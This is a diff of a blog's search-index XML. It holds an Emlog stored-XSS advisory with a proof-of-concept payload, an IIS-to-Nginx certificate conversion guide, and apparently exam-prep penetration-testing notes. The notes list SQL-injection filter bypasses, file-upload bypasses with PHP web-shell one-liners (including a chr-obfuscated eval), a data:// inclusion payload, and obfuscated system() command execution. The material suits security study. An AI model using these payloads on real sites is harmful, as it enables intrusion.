@@ -69,6 +69,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Emlog Stored Cross-Site Scripting(XSS)-article function</title>
+    <url>/2024/03/22/Emlog%20Stored%20Cross-Site%20Scripting(XSS)%20Article%20Function/</url>
+    <content><![CDATA[<h1 id="Emlog-Stored-Cross-Site-Scripting-XSS"><a href="#Emlog-Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Emlog Stored Cross-Site Scripting(XSS)"></a>Emlog Stored Cross-Site Scripting(XSS)</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The client lacks proper validation when storing user input, resulting in a stored xss vulnerability.</p>
+<h2 id="Vendor-Homepage"><a href="#Vendor-Homepage" class="headerlink" title="Vendor Homepage"></a>Vendor Homepage</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.emlog.net/</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/emlog/</span>emlog</span><br></pre></td></tr></table></figure>
+
+<h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><ol>
+<li>Register and log in as administrator.</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222128072.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222132670.png"></p>
+<ol start="2">
+<li>Click “发新文章” on Personal Page.</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222132818.png"></p>
+<ol start="3">
+<li>Input payload：</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">![1](1&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>Then click “立即发布” botton.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222129409.png"></p>
+<ol start="4">
+<li>All users now will trigger the attack code and a pop-up window when they enter the homepage of the website.</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222130636.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222135818.png"></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+        <tag>OWASP-TOP10</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Emlog Stored Cross-Site Scripting(XSS)</title>
     <url>/2024/03/22/Emlog%20Stored%20Cross-Site%20Scripting(XSS)/</url>
     <content><![CDATA[<h1 id="Emlog-Stored-Cross-Site-Scripting-XSS"><a href="#Emlog-Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Emlog Stored Cross-Site Scripting(XSS)"></a>Emlog Stored Cross-Site Scripting(XSS)</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The client lacks proper validation when storing user input, resulting in a stored xss vulnerability.</p>
@@ -105,39 +141,60 @@
       </tags>
   </entry>
   <entry>
-    <title>Emlog Stored Cross-Site Scripting(XSS)-article function</title>
-    <url>/2024/03/22/Emlog%20Stored%20Cross-Site%20Scripting(XSS)%20Article%20Function/</url>
-    <content><![CDATA[<h1 id="Emlog-Stored-Cross-Site-Scripting-XSS"><a href="#Emlog-Stored-Cross-Site-Scripting-XSS" class="headerlink" title="Emlog Stored Cross-Site Scripting(XSS)"></a>Emlog Stored Cross-Site Scripting(XSS)</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The client lacks proper validation when storing user input, resulting in a stored xss vulnerability.</p>
-<h2 id="Vendor-Homepage"><a href="#Vendor-Homepage" class="headerlink" title="Vendor Homepage"></a>Vendor Homepage</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.emlog.net/</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/emlog/</span>emlog</span><br></pre></td></tr></table></figure>
+    <title>IIS证书转Nginx证书</title>
+    <url>/2025/01/07/IIS%E8%AF%81%E4%B9%A6%E8%BD%ACNginx%E8%AF%81%E4%B9%A6/</url>
+    <content><![CDATA[<h1 id="IIS证书转Nginx证书"><a href="#IIS证书转Nginx证书" class="headerlink" title="IIS证书转Nginx证书"></a>IIS证书转Nginx证书</h1><blockquote>
+<p>要求：CA服务器、<a href="https://slproweb.com/products/Win32OpenSSL.html">OpenSSL</a></p>
+</blockquote>
+<h2 id="创建证书请求文件"><a href="#创建证书请求文件" class="headerlink" title="创建证书请求文件"></a>创建证书请求文件</h2><p>新建req.inf</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$Windows</span> NT$</span><br><span class="line"></span><br><span class="line"><span class="section">[NewRequest]</span></span><br><span class="line"><span class="attr">Subject</span> = CN=Server2019</span><br><span class="line"><span class="attr">KeySpec</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">KeyLength</span> = <span class="number">2048</span></span><br><span class="line"><span class="attr">Exportable</span> = <span class="literal">TRUE</span></span><br><span class="line"><span class="attr">MachineKeySet</span> = <span class="literal">TRUE</span></span><br><span class="line"><span class="attr">KeyUsage</span> = <span class="number">0</span>xa0</span><br><span class="line"><span class="attr">RequestType</span> = PKCS10</span><br><span class="line"></span><br><span class="line"><span class="section">[RequestAttributes]</span></span><br><span class="line"><span class="attr">CertificateTemplate</span> = WebServer</span><br><span class="line"></span><br><span class="line"><span class="section">[Extensions]</span></span><br><span class="line"><span class="attr">2.5.29.17</span> = <span class="string">&quot;&#123;text&#125;&quot;</span></span><br><span class="line"><span class="attr">_continue_</span> = <span class="string">&quot;DNS=localhost&amp;&quot;</span></span><br><span class="line"><span class="attr">_continue_</span> = <span class="string">&quot;IPAddress=192.168.242.171&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><ol>
-<li>Register and log in as administrator.</li>
-</ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222128072.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222132670.png"></p>
-<ol start="2">
-<li>Click “发新文章” on Personal Page.</li>
-</ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222132818.png"></p>
-<ol start="3">
-<li>Input payload：</li>
-</ol>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">![1](1&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;)</span></span></span><br></pre></td></tr></table></figure>
+<p>CN：域名</p>
+<p>DNS：域名</p>
+<p>IPAddress：服务器地址（纯内网访问填内网地址，外部访问填公网地址）</p>
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072050193.png"></p>
+<p>管理员模式CMD执行certreq命令</p>
+<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">certreq -new <span class="name">C</span>:\Users\server2019\Desktop\req.inf <span class="name">C</span>:\Users\server2019\Desktop\req_new.txt</span><br></pre></td></tr></table></figure>
 
-<p>Then click “立即发布” botton.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222129409.png"></p>
-<ol start="4">
-<li>All users now will trigger the attack code and a pop-up window when they enter the homepage of the website.</li>
-</ol>
-<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222130636.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/Cey1anze/Blog_Images@main/pic/202403222135818.png"></p>
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072057548.png"></p>
+<h2 id="提交证书申请"><a href="#提交证书申请" class="headerlink" title="提交证书申请"></a>提交证书申请</h2><p>打开req_new.txt，访问CA服务器的Web界面（用域管理员账户登录）</p>
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072101050.png"></p>
+<p>选择“申请证书” –&gt; “高级证书申请”，粘贴req_new.txt中的内容，证书模板选择Web服务器，点击提交。下载证书链，获得<code>certnew.p7b</code></p>
+<h2 id="导出带私钥的PFX证书"><a href="#导出带私钥的PFX证书" class="headerlink" title="导出带私钥的PFX证书"></a>导出带私钥的PFX证书</h2><p>打开p7b文件，安装证书</p>
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072106474.png"></p>
+<p>“本地计算机” –&gt; “下一页” –&gt; “将所有的证书都放入下列存储” –&gt; “浏览” –&gt; “受信任的根证书颁发机构” –&gt; “下一页” –&gt; “完成”</p>
+<p>WIN + R 打开mmc，“文件” –&gt; “添加管理单元” –&gt; “证书” –&gt; “添加” –&gt; “计算机账户” –&gt; “下一页” –&gt; “本地计算机” –&gt; “完成”</p>
+<p>找到受信任的根证书颁发机构 – 证书 ，找到刚才导入的证书，证书图标上带小钥匙，说明带密钥</p>
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072113234.png"></p>
+<p>右键证书 – 所有任务 – 导出 – 下一页 – 是，导出私钥 – 下一页 – 不做修改，直接下一页 – 勾选密码 – 设置一个密码 – 加密：AES-256-SHA256 – 确定 – 选择一个保存的位置 – 下一页 – 完成</p>
+<h2 id="转换证书"><a href="#转换证书" class="headerlink" title="转换证书"></a>转换证书</h2><blockquote>
+<p>非常不建议用网上的什么在线转换证书，很垃圾。大部分只能导出半截，要么只能私钥，要么只能公钥。</p>
+</blockquote>
+<p>进入安装好的OpenSSL目录，默认为<code>C:\Program Files\OpenSSL-Win64\bin</code>，在这个目录打开cmd</p>
+<p>输入这3条命令用于生成服务器证书、CA证书、私钥（生成的文件在bin目录，要改的话自己指定-out的目录）</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -<span class="keyword">in</span> C:\Users\Administrator\Desktop\ssltest<span class="selector-class">.cn</span><span class="selector-class">.pfx</span> -nokeys -clcerts -out ssltest<span class="selector-class">.pem</span></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> C:\Users\Administrator\Desktop\ssltest<span class="selector-class">.cn</span><span class="selector-class">.pfx</span> -nokeys -cacerts -out ca<span class="selector-class">.pem</span></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> C:\Users\Administrator\Desktop\ssltest<span class="selector-class">.cn</span><span class="selector-class">.pfx</span> -nocerts -nodes -out ssltest.key</span><br></pre></td></tr></table></figure>
+
+<p>Enter Import Password:（之前导出PFX时输入的密码）</p>
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072208115.png"></p>
+<blockquote>
+<p>Tips：私钥要生成未加密的，不然Web服务无法用。如果要在网络上传输私钥，用加密的私钥。密码单独以安全的方式发送给对方，对方用下面的命令解密密钥</p>
+</blockquote>
+<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> ssltest_enc.<span class="keyword">key</span> -<span class="keyword">out</span> ssltest.<span class="keyword">key</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072224465.png"></p>
+<p>校验密钥哈希值的命令</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">openssl rsa -in ssltest.key -outform DER <span class="string">| openssl dgst -sha256</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><blockquote>
+<p>需要安装CA证书，否则还是会显示连接不安全（即客户端要认为颁发者是可信的）如果没有装，访问CA服务器Web界面下载CA证书，安装到计算机的受信任的根证书颁发机构。域环境CA服务器会自动下发证书到域内所有计算机。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072229085.png"><br><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072229669.png"></p>
 ]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
       <tags>
-        <tag>XSS</tag>
-        <tag>OWASP-TOP10</tag>
+        <tag>Web基础</tag>
       </tags>
   </entry>
   <entry>
@@ -230,63 +287,6 @@
 <p>HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议（无连接）</p>
 <p>从HTTP&#x2F;1.1起，默认都开启了Keep-Alive，保持连接特性，简单地说，当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接</p>
 <p> Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个时间</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>Web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IIS证书转Nginx证书</title>
-    <url>/2025/01/07/IIS%E8%AF%81%E4%B9%A6%E8%BD%ACNginx%E8%AF%81%E4%B9%A6/</url>
-    <content><![CDATA[<h1 id="IIS证书转Nginx证书"><a href="#IIS证书转Nginx证书" class="headerlink" title="IIS证书转Nginx证书"></a>IIS证书转Nginx证书</h1><blockquote>
-<p>要求：CA服务器、<a href="https://slproweb.com/products/Win32OpenSSL.html">OpenSSL</a></p>
-</blockquote>
-<h2 id="创建证书请求文件"><a href="#创建证书请求文件" class="headerlink" title="创建证书请求文件"></a>创建证书请求文件</h2><p>新建req.inf</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$Windows</span> NT$</span><br><span class="line"></span><br><span class="line"><span class="section">[NewRequest]</span></span><br><span class="line"><span class="attr">Subject</span> = CN=Server2019</span><br><span class="line"><span class="attr">KeySpec</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">KeyLength</span> = <span class="number">2048</span></span><br><span class="line"><span class="attr">Exportable</span> = <span class="literal">TRUE</span></span><br><span class="line"><span class="attr">MachineKeySet</span> = <span class="literal">TRUE</span></span><br><span class="line"><span class="attr">KeyUsage</span> = <span class="number">0</span>xa0</span><br><span class="line"><span class="attr">RequestType</span> = PKCS10</span><br><span class="line"></span><br><span class="line"><span class="section">[RequestAttributes]</span></span><br><span class="line"><span class="attr">CertificateTemplate</span> = WebServer</span><br><span class="line"></span><br><span class="line"><span class="section">[Extensions]</span></span><br><span class="line"><span class="attr">2.5.29.17</span> = <span class="string">&quot;&#123;text&#125;&quot;</span></span><br><span class="line"><span class="attr">_continue_</span> = <span class="string">&quot;DNS=localhost&amp;&quot;</span></span><br><span class="line"><span class="attr">_continue_</span> = <span class="string">&quot;IPAddress=192.168.242.171&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>CN：域名</p>
-<p>DNS：域名</p>
-<p>IPAddress：服务器地址（纯内网访问填内网地址，外部访问填公网地址）</p>
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072050193.png"></p>
-<p>管理员模式CMD执行certreq命令</p>
-<figure class="highlight moonscript"><table><tr><td class="code"><pre><span class="line">certreq -new <span class="name">C</span>:\Users\server2019\Desktop\req.inf <span class="name">C</span>:\Users\server2019\Desktop\req_new.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072057548.png"></p>
-<h2 id="提交证书申请"><a href="#提交证书申请" class="headerlink" title="提交证书申请"></a>提交证书申请</h2><p>打开req_new.txt，访问CA服务器的Web界面（用域管理员账户登录）</p>
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072101050.png"></p>
-<p>选择“申请证书” –&gt; “高级证书申请”，粘贴req_new.txt中的内容，证书模板选择Web服务器，点击提交。下载证书链，获得<code>certnew.p7b</code></p>
-<h2 id="导出带私钥的PFX证书"><a href="#导出带私钥的PFX证书" class="headerlink" title="导出带私钥的PFX证书"></a>导出带私钥的PFX证书</h2><p>打开p7b文件，安装证书</p>
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072106474.png"></p>
-<p>“本地计算机” –&gt; “下一页” –&gt; “将所有的证书都放入下列存储” –&gt; “浏览” –&gt; “受信任的根证书颁发机构” –&gt; “下一页” –&gt; “完成”</p>
-<p>WIN + R 打开mmc，“文件” –&gt; “添加管理单元” –&gt; “证书” –&gt; “添加” –&gt; “计算机账户” –&gt; “下一页” –&gt; “本地计算机” –&gt; “完成”</p>
-<p>找到受信任的根证书颁发机构 – 证书 ，找到刚才导入的证书，证书图标上带小钥匙，说明带密钥</p>
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072113234.png"></p>
-<p>右键证书 – 所有任务 – 导出 – 下一页 – 是，导出私钥 – 下一页 – 不做修改，直接下一页 – 勾选密码 – 设置一个密码 – 加密：AES-256-SHA256 – 确定 – 选择一个保存的位置 – 下一页 – 完成</p>
-<h2 id="转换证书"><a href="#转换证书" class="headerlink" title="转换证书"></a>转换证书</h2><blockquote>
-<p>非常不建议用网上的什么在线转换证书，很垃圾。大部分只能导出半截，要么只能私钥，要么只能公钥。</p>
-</blockquote>
-<p>进入安装好的OpenSSL目录，默认为<code>C:\Program Files\OpenSSL-Win64\bin</code>，在这个目录打开cmd</p>
-<p>输入这3条命令用于生成服务器证书、CA证书、私钥（生成的文件在bin目录，要改的话自己指定-out的目录）</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -<span class="keyword">in</span> C:\Users\Administrator\Desktop\ssltest<span class="selector-class">.cn</span><span class="selector-class">.pfx</span> -nokeys -clcerts -out ssltest<span class="selector-class">.pem</span></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> C:\Users\Administrator\Desktop\ssltest<span class="selector-class">.cn</span><span class="selector-class">.pfx</span> -nokeys -cacerts -out ca<span class="selector-class">.pem</span></span><br><span class="line">openssl pkcs12 -<span class="keyword">in</span> C:\Users\Administrator\Desktop\ssltest<span class="selector-class">.cn</span><span class="selector-class">.pfx</span> -nocerts -nodes -out ssltest.key</span><br></pre></td></tr></table></figure>
-
-<p>Enter Import Password:（之前导出PFX时输入的密码）</p>
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072208115.png"></p>
-<blockquote>
-<p>Tips：私钥要生成未加密的，不然Web服务无法用。如果要在网络上传输私钥，用加密的私钥。密码单独以安全的方式发送给对方，对方用下面的命令解密密钥</p>
-</blockquote>
-<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> ssltest_enc.<span class="keyword">key</span> -<span class="keyword">out</span> ssltest.<span class="keyword">key</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072224465.png"></p>
-<p>校验密钥哈希值的命令</p>
-<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">openssl rsa -in ssltest.key -outform DER <span class="string">| openssl dgst -sha256</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><blockquote>
-<p>需要安装CA证书，否则还是会显示连接不安全（即客户端要认为颁发者是可信的）如果没有装，访问CA服务器Web界面下载CA证书，安装到计算机的受信任的根证书颁发机构。域环境CA服务器会自动下发证书到域内所有计算机。</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072229085.png"><br><img src="https://raw.githubusercontent.com/Cey1anze/Blog_Images/main/pic/202501072229669.png"></p>
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -446,6 +446,154 @@
         <tag>metasploit</tag>
         <tag>渗透测试</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/03/01/PTE/</url>
+    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">空格被过滤，使用 `/**/` 替代</span><br><span class="line"></span><br><span class="line">union被屏蔽，双写绕过</span><br><span class="line"></span><br><span class="line">注释符被过滤，使用 `;%<span class="number">00</span>` 替代</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.文件头绕过</span><br><span class="line">GIF89a</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.文件MIME绕过</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.文件名绕过</span><br><span class="line">php / php5 / pht / phtml / shtml / pwml / phtm</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.内容绕过</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">EvAl</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//或者chr绕过恶意函数检测</span></span><br><span class="line"><span class="meta">&lt;?php</span> (@<span class="title function_ invoke__">chr</span>(<span class="number">101</span>).<span class="title function_ invoke__">chr</span>(<span class="number">118</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">108</span>))(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">通杀</span></span><br><span class="line"><span class="language-xml">data://a://text/plain,</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>查看文件的函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">2</span>.<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">3</span>.<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>)))));</span><br><span class="line"><span class="number">4</span>.<span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">5</span>.<span class="keyword">require</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">6</span>.<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>)</span><br><span class="line"><span class="number">7</span>.<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="number">9</span>.<span class="keyword">try</span>&#123;<span class="variable">$dbh</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span>= <span class="literal">null</span>;&#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;<span class="keyword">die</span>();</span><br><span class="line"><span class="number">10</span>.<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="number">11</span>.<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));<span class="comment">//file — 把整个文件读入一个数组中</span></span><br><span class="line"><span class="number">12</span>.<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">13</span>.通过fopen去读取文件内容</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetcsv</span>()</span><br><span class="line"><span class="title function_ invoke__">gpassthru</span>()</span><br><span class="line">payload:</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一行一行读取</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;<span class="comment">//一个一个字符读取</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>.非正常读取直接看：</span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>命令执行函数</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.system(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line">2.<span class="built_in">echo</span> `<span class="built_in">ls</span>`;</span><br><span class="line"></span><br><span class="line">3.passthru(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">4.<span class="built_in">echo</span> <span class="built_in">exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">5.<span class="built_in">echo</span> shell_exec(<span class="string">&quot;whoami&quot;</span>);//同反引号</span><br></pre></td></tr></table></figure>
+
+<p>绕过</p>
+<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;ls&quot;);<span class="comment">//这里必须是双引号</span></span><br><span class="line"><span class="number">2.8</span>进制</span><br><span class="line"><span class="number">3</span><span class="selector-class">.Unicode</span>方式</span><br><span class="line"></span><br><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st)<span class="selector-class">.em</span>)(whoami);</span><br><span class="line">(sy.(st)<span class="selector-class">.em</span>)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
